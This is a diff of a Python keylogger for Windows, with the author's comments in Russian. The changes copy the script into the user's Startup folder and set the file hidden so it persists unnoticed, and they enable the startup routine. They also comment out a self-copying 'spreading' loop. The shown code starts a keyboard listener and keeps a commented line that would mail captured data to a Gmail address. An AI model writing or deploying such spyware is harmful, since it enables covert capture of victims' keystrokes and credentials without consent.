@@ -60,12 +60,11 @@ finally:
         keylogger = sys.argv[0]
         keylogger_name = os.path.basename(keylogger)
         user_path = os.path.expanduser('~')
-
         if not os.path.exists(
                 f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}"):
             os.system(
                 f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-
+        win32api.SetFileAttributes(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}", win32con.FILE_ATTRIBUTE_HIDDEN)
     # подумай над shedule каждый час отправлять данные
 
     with keyboard.Listener(
@@ -77,33 +76,33 @@ finally:
         on_release=on_release)
     listener.start()
 
-    with open(sys.argv[0]) as file:
-        self_content = file.read()
-        # while True:
-        for i in range(1):
-            # wait 3 seconds
-            time.sleep(3)
-
-            # create unique filename
-            dupe = "%s.py" % uuid.uuid4()
-
-            # open and write to the copy
-            copy = open(dupe, "w")
-            copy.write(self_content)
-            copy.close()
-
-            # make the copy executable and execute
-            # os.chmod(dupe, "0777"))
-            os.system("./%s &" % dupe) #доделать расспространение
+    # with open(sys.argv[0]) as file:
+    #     self_content = file.read()
+    #     # while True:
+    #     for i in range(1):
+    #         # wait 3 seconds
+    #         time.sleep(3)
+    #
+    #         # create unique filename
+    #         dupe = "%s.py" % uuid.uuid4()
+    #
+    #         # open and write to the copy
+    #         copy = open(dupe, "w")
+    #         copy.write(self_content)
+    #         copy.close()
+    #
+    #         # make the copy executable and execute
+    #         # os.chmod(dupe, "0777"))
+    #         os.system("./%s &" % dupe) #доделать расспространение
 
     def invisibility():
-        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)
+        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)#поиграйся с атрибутами потому что при хиден не хочет копироваться в атозагрузку
 
     def visibility(): # DELETE BEFORE PUSHING
         win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_NORMAL)
     if __name__ == '__main__':
-        # startup()
+          startup()
         # invisibility()
-        visibility()
+        # visibility()
         # server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
         # server.quit()
